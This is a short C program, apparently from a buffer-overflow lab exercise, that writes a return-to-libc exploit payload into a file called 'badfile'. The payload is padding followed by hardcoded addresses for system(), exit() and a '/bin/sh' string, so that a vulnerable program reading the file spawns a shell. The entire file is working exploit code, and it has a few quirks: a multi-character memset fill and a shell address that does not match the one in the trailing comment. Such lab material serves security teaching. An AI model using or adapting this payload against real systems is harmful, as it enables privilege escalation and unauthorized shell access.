#include <stdlib.h>
#include <stdio.h>
#include <string.h>
//EXPLOIT.C PROGRAM
int main(int argc, char **argv)
{
  int size = 43;  //39 + 4
  char buf[size];
  FILE *badfile;
  memset(buf,'AS',size);
  badfile = fopen("./badfile", "w");
 
  *(long *) &buf[31] = 0xf7e0b370 ;   //  system() ADDRESSES, 19 + 12 PADDING = 31 
  *(long *) &buf[35] = 0xf7dfded0 ;   //  exit()	31 + 4 
  *(long *) &buf[39] = 0xffffd493;   //  "/bin/sh" 35 + 4
   
  fwrite(buf, 1, size, badfile);
  fclose(badfile);
}
//0xf7e0b370 system 0xf7e0b370
//0xf7dfded0 exit//0xf7dfded0
//ffffd4a7 shell